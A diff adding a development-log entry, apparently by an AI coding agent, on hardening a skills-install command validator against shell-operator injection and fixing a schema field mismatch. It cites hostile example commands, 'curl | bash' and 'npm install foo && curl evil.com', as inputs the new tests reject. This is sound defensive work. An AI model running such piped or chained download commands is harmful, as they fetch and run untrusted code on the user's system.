@@ -2,6 +2,18 @@
 
 Security hardening: provider path resolution, cross-provider dependencies, vulnerability fixes.
 
+## [2026-03-03 21:30] — Fix two P1 PR review comments on skills install
+
+**Task:** Address two P1 Codex review comments on PR #62 for the skills install architecture
+**What I did:**
+1. Added shell operator rejection to `validateRunCommand` — regex `SHELL_OPERATOR_RE` blocks `;`, `&&`, `||`, `|`, backticks, `$()`, `>`, `<` before prefix check fires
+2. Renamed `name` to `skill` in tool catalog for `install` and `install_status` TypeBox objects to match IPC schema's `skill: safeString(200)` field
+3. Added 11 new tests for shell operator injection (&&, ;, ||, |, $(), backticks, >, <, $VAR)
+4. Updated test assertions: `curl | bash` now rejected as shell operator (not unknown prefix), INVALID_CMD_SKILL test updated
+**Files touched:** src/utils/install-validator.ts, src/agent/tool-catalog.ts, tests/utils/install-validator.test.ts, tests/host/ipc-handlers/skills-install.test.ts
+**Outcome:** Success — 2298 tests pass, build clean
+**Notes:** The `name` vs `skill` mismatch would have caused strict Zod validation to reject install requests at runtime. Shell operator check catches `npm install foo && curl evil.com` which previously passed prefix-only validation.
+
 ## [2026-03-02 12:25] — Isolate identity files from admin config in sandbox mount
 
 **Task:** Restructure agent directory so the sandbox only sees identity files (AGENTS.md, SOUL.md, IDENTITY.md, HEARTBEAT.md) in /workspace/identity, not admin files (admins, capabilities.yaml, BOOTSTRAP.md)
